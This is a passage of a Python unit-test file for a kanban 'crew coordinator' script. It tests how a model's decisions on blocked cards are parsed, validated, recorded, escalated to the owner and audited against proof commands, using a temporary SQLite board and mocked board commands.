#!/usr/bin/env python3
"""Unit tests for the pure logic in scripts/crew_coordinator.py.

The pass is exercised against a throwaway board with the three tables it reads (HERMES_KANBAN_DB and
HERMES_HOME point at a temp dir before the module is imported), the model call is a function the test hands
in, and the verbs that would change a real board (`hermes kanban ...`) are replaced. The end-to-end run on a
scratch kanban.db with the real verbs is scripts/crew_coordinator_proof.py.
"""
import json
import os
import sqlite3
import sys
import tempfile
import time
import unittest
from pathlib import Path
from unittest import mock

REPO = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(REPO / "scripts"))

_TMP = tempfile.mkdtemp(prefix="crew-coordinator-unit-")
_DB = os.path.join(_TMP, "kanban.db")
os.environ["HERMES_HOME"] = os.path.join(_TMP, "home")
os.environ["HERMES_KANBAN_DB"] = _DB
os.environ["KANBAN_DB"] = _DB
# A unit test never starts the real `hermes`: under this scratch HERMES_HOME it bootstraps a whole runtime and
# rewrites the live launcher to point at it (it did, twice). Any stray call fails at once instead.
os.environ["HERMES_BIN"] = "/bin/false"

import crew_coordinator as cc  # noqa: E402

CREW_BODY = "Role: worker\nCoordinator: proof/x\nBudget: 200000 tokens\nGOAL: g\nDone when: d\nproof command: false\n"


def build_db():
    if os.path.exists(_DB):
        os.unlink(_DB)
    conn = sqlite3.connect(_DB)
    conn.executescript(
        "create table tasks (id text primary key, title text, body text, status text, assignee text, "
        "created_by text, created_at integer, last_failure_error text, block_kind text, workspace_path text);"
        "create table task_runs (id integer primary key, task_id text, profile text, status text, outcome text, "
        "error text, summary text, started_at integer, ended_at integer);"
        "create table task_links (parent_id text, child_id text);"
        "create table task_events (id integer primary key, task_id text, run_id integer, kind text, payload text, "
        "created_at integer);")
    conn.commit()
    conn.close()


def sql(query, args=()):
    conn = sqlite3.connect(_DB)
    try:
        conn.execute(query, args)
        conn.commit()
    finally:
        conn.close()


def add_card(cid="t_1", status="blocked", body=CREW_BODY, created_by="owner", block_kind="needs_input"):
    sql("insert into tasks (id, title, body, status, assignee, created_by, created_at, block_kind) "
        "values (?,?,?,?,?,?,?,?)", (cid, "a card", body, status, "crew-worker", created_by, 1, block_kind))


def add_event(cid, kind, payload=None):
    sql("insert into task_events (task_id, kind, payload, created_at) values (?,?,?,?)",
        (cid, kind, json.dumps(payload or {}), int(time.time())))
    conn = sqlite3.connect(_DB)
    try:
        return conn.execute("select max(id) from task_events").fetchone()[0]
    finally:
        conn.close()


def events(cid, kind):
    conn = sqlite3.connect(_DB)
    try:
        return [json.loads(r[0] or "{}") for r in conn.execute(
            "select payload from task_events where task_id = ? and kind = ? order by id", (cid, kind))]
    finally:
        conn.close()


class ParseDecisionTests(unittest.TestCase):
    def test_the_last_object_with_a_decision_wins(self):
        text = 'thinking {"a": 1}\n{"decision": "verify"}\nmore\n{"decision": "retry", "fix": "x"}\n'
        self.assertEqual({"decision": "retry", "fix": "x"}, cc.parse_decision(text))

    def test_nested_braces_and_prose_around_it(self):
        text = 'I decide:\n{"decision": "split", "children": [{"title": "a"}, {"title": "b"}]} done'
        self.assertEqual(2, len(cc.parse_decision(text)["children"]))

    def test_no_decision_key_is_none(self):
        self.assertIsNone(cc.parse_decision('{"verdict": "PASS"}'))
        self.assertIsNone(cc.parse_decision("no json here"))
        self.assertIsNone(cc.parse_decision(""))
        self.assertIsNone(cc.parse_decision(None))

    def test_a_brace_in_prose_does_not_hide_the_real_answer(self):
        self.assertEqual("verify", cc.parse_decision('use {curly} words {"decision": "verify"}')["decision"])


class CheckDecisionTests(unittest.TestCase):
    def test_every_verb_needs_its_field(self):
        bad = [{"decision": "retry"}, {"decision": "retry", "fix": "  "}, {"decision": "rescope"},
               {"decision": "split"}, {"decision": "split", "children": []}, {"decision": "ask_owner"},
               {"decision": "close"}, {"decision": "abandon"}, {"decision": "nonsense"}, {}]
        for dec in bad:
            with self.subTest(dec=dec):
                self.assertTrue(cc.check_decision(dec))

    def test_complete_answers_pass(self):
        good = [{"decision": "retry", "fix": "use tmp"}, {"decision": "rescope", "done_when": "x"},
                {"decision": "split", "children": [{"title": "a"}]}, {"decision": "ask_owner", "question": "q?"},
                {"decision": "close", "why": "PASS"}, {"decision": "abandon", "why": "scrapped"},
                {"decision": "verify"}]
        for dec in good:
            with self.subTest(dec=dec):
                self.assertEqual("", cc.check_decision(dec))


class ContractEditTests(unittest.TestCase):
    def test_rewrite_line_replaces_or_appends(self):
        self.assertIn("Done when: new one", cc.crew_card.rewrite_line("GOAL: g\nDone when: old\n", "Done when", "new  one"))
        self.assertNotIn("old", cc.crew_card.rewrite_line("GOAL: g\nDone when: old\n", "Done when", "new"))
        self.assertTrue(cc.crew_card.rewrite_line("GOAL: g\n", "proof command", "true").rstrip().endswith("proof command: true"))

    def test_fix_numbering_is_idempotent(self):
        once = cc.coordinator_fix_body("GOAL: g\n", 1, {"fix": "use tmp", "constraints": "no root"})
        self.assertIn("Coordinator fix 1: use tmp", once)
        self.assertIn("Coordinator constraints 1: no root", once)
        self.assertEqual(once, cc.coordinator_fix_body(once, 1, {"fix": "use tmp"}))
        self.assertIn("Coordinator fix 2:", cc.coordinator_fix_body(once, 2, {"fix": "other"}))

    def test_budget_is_cut_to_twice_the_role_default(self):
        ceiling = 2 * int(cc.crew_card.roles_defaults().get("default_budget_tokens") or cc.crew_card.DEFAULT_BUDGET)
        self.assertEqual(ceiling, cc.clamp_budget(10 ** 9))
        self.assertEqual(250000, cc.clamp_budget("250000"))
        self.assertIsNone(cc.clamp_budget(None))
        self.assertIsNone(cc.clamp_budget(0))

    def test_fix_count_restarts_after_the_owner_was_asked(self):
        ds = [{"decision": "retry"}, {"decision": "rescope"}, {"decision": "ask_owner"}, {"decision": "retry"}]
        self.assertEqual(1, cc.fix_count(ds))
        self.assertEqual(2, cc.fix_count(ds[:2]))
        self.assertEqual(0, cc.fix_count([{"decision": "error"}, {"decision": "close"}]))


class StateFileTests(unittest.TestCase):
    def setUp(self):
        self.board = "b%d" % time.time_ns()

    def test_the_cursor_round_trips_per_board(self):
        self.assertIsNone(cc.load_cursor(self.board))
        cc.save_cursor(42, self.board)
        self.assertEqual(42, cc.load_cursor(self.board))
        self.assertIsNone(cc.load_cursor(self.board + "x"))
        self.assertNotEqual(cc.state_path("coordinator-cursor.json", None), cc.state_path("coordinator-cursor.json", self.board))

    def test_the_default_board_keeps_the_plain_file_name(self):
        self.assertTrue(cc.state_path("coordinator-cursor.json", "default").endswith("coordinator-cursor.json"))
        self.assertTrue(cc.state_path("coordinator.lock", None).endswith("coordinator.lock"))

    def test_a_live_lock_blocks_and_a_dead_one_is_taken_over(self):
        self.assertTrue(cc.take_lock(self.board))
        self.assertTrue(cc.lock_live(self.board))
        self.assertFalse(cc.take_lock(self.board))
        cc.drop_lock(self.board)
        self.assertFalse(cc.lock_live(self.board))
        path = cc.state_path("coordinator.lock", self.board)
        with open(path, "w") as fh:
            fh.write("999999999")                     # no such pid
        self.assertFalse(cc.lock_live(self.board))
        self.assertTrue(cc.take_lock(self.board))
        cc.drop_lock(self.board)

    def test_an_old_lock_is_stale_even_with_a_live_pid(self):
        self.assertTrue(cc.take_lock(self.board))
        path = cc.state_path("coordinator.lock", self.board)
        old = time.time() - cc.LOCK_STALE_S - 5
        os.utime(path, (old, old))
        self.assertFalse(cc.lock_live(self.board))
        cc.drop_lock(self.board)

    def test_board_db_honours_a_pin_then_the_board_dir(self):
        self.assertEqual(_DB, cc.board_db(None))
        with mock.patch.dict(os.environ, {"HERMES_KANBAN_DB": ""}):
            self.assertTrue(cc.board_db(None).endswith("kanban.db"))
            self.assertTrue(cc.board_db("proofs").endswith(os.path.join("kanban", "boards", "proofs", "kanban.db")))


class HandleCardTests(unittest.TestCase):
    """handle_card: which cards the pass acts on, and what it records."""

    def setUp(self):
        build_db()
        self.asked = []
        self.applied = []

        def decider(ctx, facts_path):
            self.asked.append(Path(facts_path).read_text())
            return self.answer, 0

        self.answer = 'ok\n{"decision": "retry", "fix": "use tmp"}'
        self.ctx = cc.Ctx(_DB, None, dry=False, decider=decider, say=lambda *_: None)
        patches = [
            mock.patch.object(cc, "worker_log_tail", lambda cid: ""),
            mock.patch.object(cc.crew_heal, "heal_card", lambda card, dry: None),
            mock.patch.object(cc.crew_heal, "KANBAN_DB", _DB),          # main() binds it; bound here by hand
            mock.patch.dict(os.environ, {"HERMES_KANBAN_DB": _DB}),
            mock.patch.object(cc, "apply_decision",
                              lambda ctx, card, decisions, dec: (self.applied.append(dec) or True, "applied")),
        ]
        for p in patches:
            p.start()
            self.addCleanup(p.stop)

    def handle(self, cid="t_1"):
        evs = [dict(e, payload=e["payload"]) for e in cc.q(self.ctx,
               "select id, kind, payload, created_at from task_events where task_id = ? and kind in "
               "('blocked','block_loop_detected','gave_up','respawn_guarded') order by id", (cid,))]
        return cc.handle_card(self.ctx, cid, evs)

    def test_a_blocked_crew_card_is_decided_and_recorded_with_its_event(self):
        add_card()
        ev = add_event("t_1", "blocked")
        got = self.handle()
        self.assertEqual(("retry", False), (got["action"], got["pending"]))
        rec = events("t_1", "crew_decision")
        self.assertEqual(1, len(rec))
        self.assertEqual((ev, "retry", True), (rec[0]["for_event"], rec[0]["decision"], rec[0]["applied"]))
        self.assertEqual(1, len(self.asked))
        self.assertIn("card: t_1  status: blocked", self.asked[0])

    def test_the_same_event_is_never_decided_twice(self):
        add_card()
        add_event("t_1", "blocked")
        self.handle()
        got = self.handle()
        self.assertEqual("skip", got["action"])
        self.assertIn("already decided", got["detail"])
        self.assertEqual(1, len(self.asked))

    def test_a_non_crew_archived_done_or_probe_card_is_skipped_without_a_model_call(self):
        cases = {"t_a": dict(body="just a card"), "t_b": dict(status="archived"), "t_c": dict(status="done"),
                 "t_d": dict(created_by="probe")}
        for cid, kw in cases.items():
            add_card(cid, **kw)
            add_event(cid, "blocked")
            with self.subTest(card=cid):
                self.assertEqual("skip", self.handle(cid)["action"])
        self.assertEqual([], self.asked)

    def test_a_probe_card_is_handled_when_the_proof_asks(self):
        add_card("t_p", created_by="probe")
        add_event("t_p", "blocked")
        self.ctx.probe = True
        self.assertEqual("retry", self.handle("t_p")["action"])

    def test_an_owner_stop_after_the_event_wins(self):
        add_card()
        add_event("t_1", "blocked")
        add_event("t_1", "stopped")
        got = self.handle()
        self.assertEqual("stopped by the owner", got["detail"])
        self.assertEqual([], self.asked)

    def test_a_card_waiting_on_the_owner_is_left_until_something_moves_it(self):
        add_card()
        add_event("t_1", "blocked")
        add_event("t_1", "crew_decision", {"decision": "ask_owner", "question": "q?", "for_event": 1})
        add_event("t_1", "blocked")                 # the classify-in-place event the loop's own block writes
        self.assertIn("waiting for the owner", self.handle()["detail"])
        add_event("t_1", "unblocked")
        add_event("t_1", "blocked")                 # blocked again after the owner answered: a new decision
        self.assertEqual("retry", self.handle()["action"])

    def test_an_exit_from_triage_by_the_owner_counts_as_the_owner_moving_the_card(self):
        add_card(status="triage")
        add_event("t_1", "block_loop_detected")
        add_event("t_1", "crew_decision", {"decision": "ask_owner", "question": "q?", "for_event": 1})
        self.assertIn("waiting for the owner", self.handle()["detail"])
        add_event("t_1", "specified")               # /crew-unstuck: the kernel's own triage exit
        add_event("t_1", "block_loop_detected")     # stuck again: the coordinator must look at it, not stay silent
        self.assertEqual("retry", self.handle()["action"])

    def test_the_third_fix_is_the_owners_question_and_asks_no_model(self):
        add_card()
        for _ in range(cc.MAX_COORDINATOR_RETRIES):
            add_event("t_1", "crew_decision", {"decision": "retry", "fix": "x", "for_event": 0})
        add_event("t_1", "blocked")
        with mock.patch.object(cc, "apply_decision", lambda ctx, card, decisions, dec:
                               (self.applied.append(dec) or True, "asked")):
            got = self.handle()
        self.assertEqual("ask_owner", got["action"])
        self.assertIn("retried %d times" % cc.MAX_COORDINATOR_RETRIES, self.applied[-1]["question"])
        self.assertEqual([], self.asked)

    def test_a_model_that_cannot_answer_is_an_error_row_then_the_owner(self):
        add_card()
        ev = add_event("t_1", "blocked")
        self.answer = "no json at all"
        first = self.handle()
        self.assertEqual(("error", True), (first["action"], first["pending"]))
        self.assertEqual("error", events("t_1", "crew_decision")[0]["decision"])
        self.assertEqual(2, len(self.asked))            # two attempts, the second told why
        self.assertIn("Refused", self.asked[1])
        second = self.handle()
        self.assertEqual("ask_owner", second["action"])
        self.assertEqual([ev, ev], [d["for_event"] for d in events("t_1", "crew_decision")])

    def test_a_refused_answer_is_asked_again_once_with_the_reason(self):
        add_card()
        add_event("t_1", "blocked")
        answers = iter(['{"decision": "retry"}', '{"decision": "retry", "fix": "use tmp"}'])
        self.ctx.decider = lambda ctx, path: (self.asked.append(Path(path).read_text()) or next(answers), 0)
        got = self.handle()
        self.assertEqual("retry", got["action"])
        self.assertIn("a retry needs a non-empty `fix`", self.asked[1])

    def test_an_unappliable_decision_becomes_a_question_to_the_owner(self):
        add_card()
        add_event("t_1", "blocked")
        calls = []

        def apply(ctx, card, decisions, dec):
            calls.append(dec["decision"])
            raise RuntimeError("boom")

        with mock.patch.object(cc, "apply_decision", apply), \
                mock.patch.object(cc, "apply_ask_owner", lambda ctx, card, q, detail="": (True, q)):
            got = self.handle()
        self.assertEqual("ask_owner", got["action"])
        kinds = [(d["decision"], d["applied"]) for d in events("t_1", "crew_decision")]
        self.assertEqual([("retry", False), ("ask_owner", True)], kinds)

    def test_a_dry_pass_decides_but_records_nothing(self):
        add_card()
        add_event("t_1", "blocked")
        self.ctx.dry = True
        got = self.handle()
        self.assertTrue(got["action"].startswith("would retry"))
        self.assertEqual([], events("t_1", "crew_decision"))
        self.assertEqual([], self.applied)

    def test_a_mechanical_remedy_that_fixed_the_card_asks_no_model(self):
        add_card()
        add_event("t_1", "blocked")
        with mock.patch.object(cc.crew_heal, "heal_card",
                               lambda card, dry: {"class": "stale_verify", "card": "t_1", "action": "lifted",
                                                  "fixed": True}):
            got = self.handle()
        self.assertEqual("heal:stale_verify", got["action"])
        self.assertEqual([], self.asked)
        self.assertEqual([], events("t_1", "crew_decision"))

    def test_a_ready_card_no_remedy_could_fix_goes_to_a_decision_but_a_healthy_ready_card_does_not(self):
        add_card("t_r", status="ready", block_kind=None)
        add_event("t_r", "respawn_guarded")
        self.assertIn("nothing to decide", self.handle("t_r")["detail"])
        with mock.patch.object(cc.crew_heal, "heal_card",
                               lambda card, dry: {"class": "dead_model", "card": "t_r", "action": "no pick",
                                                  "fixed": False}):
            self.assertEqual("retry", self.handle("t_r")["action"])


class CompletionAuditTests(unittest.TestCase):
    """A `completed` event is audited against the close rule: a card that is done without a PASS line for its
    proof command was closed by the owner's override (`hermes kanban complete --force`), recorded as owner_close."""

    def setUp(self):
        build_db()
        self.ctx = cc.Ctx(_DB, None, dry=False, decider=None, say=lambda *_: None)
        for path in (cc.crew_card.verdict_path("t_1"), cc.crew_card.verdict_path("t_p")):
            if os.path.exists(path):
                os.unlink(path)
        for p in (mock.patch.dict(os.environ, {"HERMES_KANBAN_DB": _DB}),
                  mock.patch.object(cc.crew_heal, "heal_card", lambda card, dry: None)):
            p.start()
            self.addCleanup(p.stop)

    def audit(self, cid="t_1"):
        evs = cc.q(self.ctx, "select id, kind, payload, created_at from task_events where task_id = ? and "
                             "kind = 'completed' order by id", (cid,))
        return cc.handle_card(self.ctx, cid, evs)

    def test_a_done_card_with_no_pass_line_is_recorded_as_the_owners_close_once(self):
        add_card(status="done", block_kind=None)
        ev = add_event("t_1", "completed")
        got = self.audit()
        self.assertEqual("owner_close", got["action"])
        rec = events("t_1", "crew_decision")
        self.assertEqual([("owner_close", ev, True)], [(d["decision"], d["for_event"], d["applied"]) for d in rec])
        self.assertIn("closed without a PASS line", rec[0]["why"])
        self.assertEqual("completion already audited", self.audit()["detail"])
        self.assertEqual(1, len(events("t_1", "crew_decision")))

    def test_a_done_card_with_a_pass_line_since_its_claim_is_audited_not_reclassified(self):
        add_card(status="done", block_kind=None)
        cc.crew_card.record_origin("t_1", env={"origin": "", "session": "s"}, proof_cmd="false")
        sql("insert into task_events (task_id, kind, payload, created_at) values ('t_1', 'claimed', '{}', ?)",
            (int(time.time()) - 30,))
        cc.crew_card.record_verdict("t_1", "false", 0, "", 0, by="crew-verifier")    # the card's proof line, forced PASS
        ev = add_event("t_1", "completed")
        with mock.patch.object(cc, "run_verdict", return_value=(0, "rc=0")) as run:
            got = self.audit()
        self.assertEqual("audit pass", got["action"])
        run.assert_called_once_with("t_1", for_event=ev)
        rec = events("t_1", "crew_decision")
        self.assertEqual([("audit", "pass", ev)], [(d["decision"], d["outcome"], d["for_event"]) for d in rec])
        with mock.patch.object(cc, "run_verdict", side_effect=AssertionError("audited twice")):
            self.assertEqual("completion already audited", self.audit()["detail"])

    def test_a_pass_from_before_the_last_claim_does_not_count(self):
        add_card(status="done", block_kind=None)
        cc.crew_card.record_verdict("t_1", "false", 0, "", 0, by="crew-verifier")
        sql("insert into task_events (task_id, kind, payload, created_at) values ('t_1', 'claimed', '{}', ?)",
            (int(time.time()) + 60,))
        add_event("t_1", "completed")
        # the claim (now + 60 s) is newer than the PASS and precedes the completed event: the PASS is stale for it
        self.assertEqual("owner_close", self.audit()["action"])

    def test_the_plan_parent_release_is_not_an_override(self):
        parent = "Role: coordinator\nCoordinator: proof/x\n\nGOAL: g\n\nDone when: children done\n"
        add_card("t_p", status="done", body=parent, block_kind=None)
        add_event("t_p", "completed")
        self.assertEqual("skip", self.audit("t_p")["action"])
        self.assertEqual([], events("t_p", "crew_decision"))

    def test_a_dry_pass_reports_and_records_nothing(self):
        add_card(status="done", block_kind=None)
        add_event("t_1", "completed")
        self.ctx.dry = True
        self.assertEqual("would owner_close", self.audit()["action"])
        self.assertEqual([], events("t_1", "crew_decision"))

    def test_the_model_can_not_answer_owner_close_and_a_closed_card_never_asks_for_a_decision(self):
        self.assertIn("unknown decision", cc.check_decision({"decision": "owner_close", "why": "x"}))
        add_card(status="done", block_kind=None)
        add_event("t_1", "completed")
        self.ctx.decider = lambda ctx, path: self.fail("the model was asked about a completion")
        self.audit()

    def test_the_coordinators_own_close_uses_the_same_rule(self):
        add_card(status="blocked")
        cc.crew_card.record_origin("t_1", env={"origin": "", "session": "s"}, proof_cmd="false")
        self.assertFalse(cc.pass_line("t_1"))
        cc.crew_card.record_verdict("t_1", "false", 0, "", 0, by=cc.crew_card.role_profile("coordinator"))
        self.assertTrue(cc.pass_line("t_1"))


class AuditProofTests(unittest.TestCase):
    """The coordinator re-runs the proof of every completed writer card, once per `completed` event: a FAIL
    comments on the done card and opens one follow-up card under it; the chain is capped and then asks the owner."""

    BODY = ("Role: worker\nCoordinator: proof/x\nVerify: proof\nBudget: 200000 tokens\nGOAL: g\nArtifact: a\n"
            "Lands at: l\nFor: owner\nConstraints: keep it small\nDone when: d\nproof command: true\n")

    def setUp(self):
        build_db()
        self.ctx = cc.Ctx(_DB, None, dry=False, decider=None, say=lambda *_: None)
        if os.path.exists(cc.crew_card.verdict_path("t_a")):
            os.unlink(cc.crew_card.verdict_path("t_a"))
        self.comments, self.opened = [], []
        for p in (mock.patch.dict(os.environ, {"HERMES_KANBAN_DB": _DB}),
                  mock.patch.object(cc.crew_heal, "heal_card", lambda card, dry: None),
                  mock.patch.object(cc, "kanban", lambda *a, **k: (self.comments.append(a) or (0, "")))):
            p.start()
            self.addCleanup(p.stop)

    def done(self, body=None, by="crew-worker"):
        add_card("t_a", status="done", body=body or self.BODY, block_kind=None)
        cc.crew_card.record_origin("t_a", env={"origin": "", "session": "s"}, proof_cmd="true")
        cc.crew_card.record_verdict("t_a", "true", 0, "", 0, by=by)
        return add_event("t_a", "completed")

    def audit(self, cid="t_a"):
        evs = cc.q(self.ctx, "select id, kind, payload, created_at from task_events where task_id = ? and "
                             "kind = 'completed' order by id", (cid,))
        return cc.handle_card(self.ctx, cid, evs)

    def test_a_failed_audit_comments_and_opens_one_follow_up_with_the_done_card_as_parent(self):
        ev = self.done()
        opened = []

        def fake_open(c, dry_run=False, allow_no_proof=False, parents=(), initial_status=None):
            opened.append((c, list(parents), initial_status))
            return {"id": "t_f1", "assignee": "crew-worker", "role": c["role"], "budget": c["budget"]}

        with mock.patch.object(cc, "run_verdict", return_value=(1, "rc=1\nthe file is gone")), \
                mock.patch.object(cc.crew_card, "open_card", fake_open):
            got = self.audit()
        self.assertEqual("audit fail: follow-up", got["action"])
        (c, parents, status), = opened
        self.assertEqual((["t_a"], None), (parents, status))
        self.assertIn("Audit follow-up 1 of t_a", c["constraints"])
        self.assertIn("keep it small", c["constraints"])                # the original constraints stay
        self.assertIn("the file is gone", c["constraints"])
        self.assertEqual(("worker", "proof", "proof/x"), (c["role"], c["verify"], c["coordinator"]))
        self.assertTrue(c["title"].startswith("audit follow-up: "))
        self.assertTrue(any(a[0] == "comment" and "audit failed" in a[2] for a in self.comments))
        rec = events("t_a", "crew_decision")
        self.assertEqual([("audit", "fail", "t_f1", ev)], [(d["decision"], d["outcome"], d["followup"], d["for_event"])
                                                          for d in rec])
        with mock.patch.object(cc, "run_verdict", side_effect=AssertionError("audited twice")):
            self.assertEqual("completion already audited", self.audit()["detail"])

    def test_the_followup_chain_is_capped_and_the_owner_is_asked_on_a_blocked_follow_up(self):
        body = self.BODY.replace("Constraints: keep it small", "Constraints: Audit follow-up 2 of t_z: it failed")
        self.done(body=body)
        opened = []

        def fake_open(c, dry_run=False, allow_no_proof=False, parents=(), initial_status=None):
            opened.append(initial_status)
            add_card("t_f2", status="blocked", body=body, block_kind=None)
            return {"id": "t_f2"}

        asked = []
        with mock.patch.object(cc, "run_verdict", return_value=(1, "rc=1\nstill failing")), \
                mock.patch.object(cc.crew_card, "open_card", fake_open), \
                mock.patch.object(cc, "apply_ask_owner", lambda ctx, card, q, detail="": (asked.append((card["id"], q))
                                                                                          or (True, "asked"))):
            got = self.audit()
        self.assertEqual("audit fail: ask_owner", got["action"])
        self.assertEqual(["blocked"], opened)
        self.assertEqual("t_f2", asked[0][0])
        self.assertIn("re-done 2 times", asked[0][1])
        self.assertEqual("ask_owner", events("t_f2", "crew_decision")[0]["decision"])
        self.assertEqual("audit", events("t_a", "crew_decision")[0]["decision"])
        self.assertTrue(events("t_a", "crew_decision")[0]["capped"])

    def test_a_follow_up_that_cannot_be_opened_is_recorded_once_and_never_retried(self):
        self.done()
        with mock.patch.object(cc, "run_verdict", return_value=(1, "rc=1")), \
                mock.patch.object(cc.crew_card, "open_card", side_effect=RuntimeError("kanban create failed")):
            got = self.audit()
            again = self.audit()
        self.assertEqual("audit fail: no follow-up", got["action"])
        self.assertEqual("completion already audited", again["detail"])
        self.assertFalse(events("t_a", "crew_decision")[0]["applied"])

    def test_a_card_closed_on_the_coordinators_own_pass_is_not_run_a_third_time(self):
        self.done(by=cc.crew_card.role_profile("coordinator"))
        with mock.patch.object(cc, "run_verdict", side_effect=AssertionError("ran the proof again")):
            got = self.audit()
        self.assertEqual("audit pass", got["action"])
        self.assertIn("coordinator's own PASS", events("t_a", "crew_decision")[0]["why"])

    def test_plan_machinery_and_an_owner_close_are_not_audited_and_a_dry_pass_runs_nothing(self):
        closeout = ("Role: coordinator\nCoordinator: proof/x\n\nGOAL: close out\n\nDone when: children done\n\n"
                    "proof command: python3 crew_card.py closeout --cards a,b\n")
        add_card("t_c", status="done", body=closeout, block_kind=None)
        cc.crew_card.record_origin("t_c", env={"origin": "", "session": "s"}, proof_cmd="python3 crew_card.py closeout --cards a,b")
        cc.crew_card.record_verdict("t_c", "python3 crew_card.py closeout --cards a,b", 0, "", 0,
                                    by=cc.crew_card.role_profile("coordinator"))
        add_event("t_c", "completed")
        with mock.patch.object(cc, "run_verdict", side_effect=AssertionError("audited plan machinery")):
            self.assertEqual("skip", self.audit("t_c")["action"])
        build_db()
        add_card("t_o", status="done", body=self.BODY, block_kind=None)             # no PASS line: the owner's close
        add_event("t_o", "completed")
        with mock.patch.object(cc, "run_verdict", side_effect=AssertionError("audited the owner's close")):
            self.assertEqual("owner_close", self.audit("t_o")["action"])
        self.done()
        self.ctx.dry = True
        with mock.patch.object(cc, "run_verdict", side_effect=AssertionError("a dry pass ran the proof")):
            self.assertEqual("would audit", self.audit()["action"])

    def test_the_model_can_not_answer_audit(self):
        self.assertIn("unknown decision", cc.check_decision({"decision": "audit", "why": "x"}))


class RunPassTests(unittest.TestCase):
    def setUp(self):
        build_db()
        self.board = "p%d" % time.time_ns()
        self.ctx = cc.Ctx(_DB, self.board, dry=False, decider=lambda c, p: ('{"decision": "verify"}', 0),
                          say=lambda *_: None)
        patch = mock.patch.object(cc, "handle_card", self.fake_handle)
        patch.start()
        self.addCleanup(patch.stop)
        self.handled = []
        self.pending = set()

    def fake_handle(self, ctx, card_id, evs):
        self.handled.append((card_id, [e["id"] for e in evs]))
        return {"card": card_id, "action": "x", "detail": "", "pending": card_id in self.pending}

    def test_the_first_pass_only_sets_the_cursor(self):
        add_card()
        add_event("t_1", "blocked")
        rep = cc.run_pass(self.ctx)
        self.assertEqual([], self.handled)
        self.assertEqual(1, cc.load_cursor(self.board))
        self.assertIn("not replayed", rep["note"])

    def test_events_after_the_cursor_are_grouped_by_card_and_the_cursor_moves(self):
        add_card("t_1")
        add_card("t_2")
        cc.save_cursor(0, self.board)
        a = add_event("t_1", "blocked")
        add_event("t_1", "heartbeat")                     # noise: never triggers
        b = add_event("t_2", "gave_up")
        c = add_event("t_1", "block_loop_detected")
        rep = cc.run_pass(self.ctx)
        self.assertEqual([("t_1", [a, c]), ("t_2", [b])], sorted(self.handled))
        self.assertEqual(4, cc.load_cursor(self.board))
        self.assertEqual(3, rep["events"])

    def test_a_pending_card_holds_the_cursor_so_the_batch_repeats(self):
        add_card("t_1")
        cc.save_cursor(0, self.board)
        add_event("t_1", "blocked")
        self.pending.add("t_1")
        cc.run_pass(self.ctx)
        self.assertEqual(0, cc.load_cursor(self.board))
        self.pending.clear()
        cc.run_pass(self.ctx)
        self.assertEqual(1, cc.load_cursor(self.board))

    def test_since_and_card_scopes_never_move_the_cursor(self):
        add_card("t_1")
        add_card("t_2")
        cc.save_cursor(5, self.board)
        add_event("t_1", "blocked")
        add_event("t_2", "blocked")
        cc.run_pass(self.ctx, since=0)
        self.assertEqual(5, cc.load_cursor(self.board))
        cc.run_pass(self.ctx, only_card="t_2")
        self.assertEqual(5, cc.load_cursor(self.board))
        self.assertEqual("t_2", self.handled[-1][0])

    def test_one_card_that_raises_does_not_stop_the_batch(self):
        add_card("t_1")
        add_card("t_2")
        cc.save_cursor(0, self.board)
        add_event("t_1", "blocked")
        add_event("t_2", "blocked")

        def boom(ctx, card_id, evs):
            if card_id == "t_1":
                raise ValueError("bad card")
            return {"card": card_id, "action": "ok", "detail": "", "pending": False}

        with mock.patch.object(cc, "handle_card", boom):
            rep = cc.run_pass(self.ctx)
        self.assertEqual(["error", "ok"], [c["action"] for c in rep["cards"]])
        self.assertEqual(0, cc.load_cursor(self.board))         # the failed card repeats next pass


class HasWorkTests(unittest.TestCase):
    """The tick gate: a pass is started only when run_pass would find something."""

    def setUp(self):
        build_db()
        self.cursor = os.path.join(os.environ["HERMES_HOME"], "crew", "coordinator-cursor.json")
        os.makedirs(os.path.dirname(self.cursor), exist_ok=True)
        if os.path.exists(self.cursor):
            os.unlink(self.cursor)

    def set_cursor(self, n):
        cc.save_cursor(n)

    def add_event(self, eid, kind):
        sql("insert into task_events (id, task_id, kind, payload, created_at) values (?, 't', ?, '{}', 0)",
            (eid, kind))

    def test_no_cursor_yet_means_one_pass_to_initialise_it(self):
        self.assertTrue(cc.has_work())

    def test_nothing_newer_than_the_cursor_is_no_work(self):
        self.add_event(5, "blocked")
        self.set_cursor(5)
        self.assertFalse(cc.has_work())

    def test_noise_events_newer_than_the_cursor_are_no_work(self):
        self.set_cursor(5)
        for i, kind in enumerate(("heartbeat", "claimed", "commented", "crew_decision"), start=6):
            self.add_event(i, kind)
        self.assertFalse(cc.has_work())

    def test_every_crew_event_kind_newer_than_the_cursor_is_work(self):
        for kind in cc.EVENT_KINDS:
            build_db()
            self.set_cursor(5)
            self.add_event(6, kind)
            self.assertTrue(cc.has_work(), kind)

    def test_it_agrees_with_run_pass_on_the_same_board(self):
        self.set_cursor(5)
        self.add_event(6, "heartbeat")
        self.assertFalse(cc.has_work())
        self.assertEqual(0, cc.run_pass(cc.Ctx(_DB, None, True, False, say=lambda *_: None))["events"])
        self.add_event(7, "gave_up")
        self.assertTrue(cc.has_work())
        self.assertEqual(1, cc.run_pass(cc.Ctx(_DB, None, True, False, say=lambda *_: None))["events"])

    def test_a_failed_owner_message_waiting_for_its_retry_is_work(self):
        self.set_cursor(5)
        self.assertFalse(cc.has_work())
        path = cc.crew_notify.state_file()
        os.makedirs(os.path.dirname(path), exist_ok=True)
        with open(path, "w") as fh:
            json.dump({"since": 1, "sent": {}, "tries": {"t_1|done:3": 1}}, fh)
        self.addCleanup(os.unlink, path)
        self.assertTrue(cc.has_work())

    def test_a_missing_board_is_no_work_and_a_broken_read_fails_open(self):
        with mock.patch.object(cc, "board_db", lambda b=None: os.path.join(_TMP, "nope.db")):
            self.assertFalse(cc.has_work())
        self.set_cursor(5)
        with mock.patch.object(cc, "q", mock.Mock(side_effect=sqlite3.OperationalError("locked"))):
            self.assertTrue(cc.has_work())


class ApplyDecisionTests(unittest.TestCase):
    """resolve + apply_decision: which board verbs each decision issues. The verbs are recorded, not run; that the
    kernel honours them is scripts/crew_coordinator_proof.py."""

    def setUp(self):
        build_db()
        self.cli = []
        self.answers = []
        self.ctx = cc.Ctx(_DB, None, dry=False, say=lambda *_: None,
                          decider=lambda ctx, facts: (self.answers.pop(0) if self.answers else "no answer", 0))
        for p in (mock.patch.object(cc, "kanban", lambda *a, **k: (self.cli.append(list(a)) or (0, "ok"))),
                  mock.patch.object(cc, "worker_log_tail", lambda cid: ""),
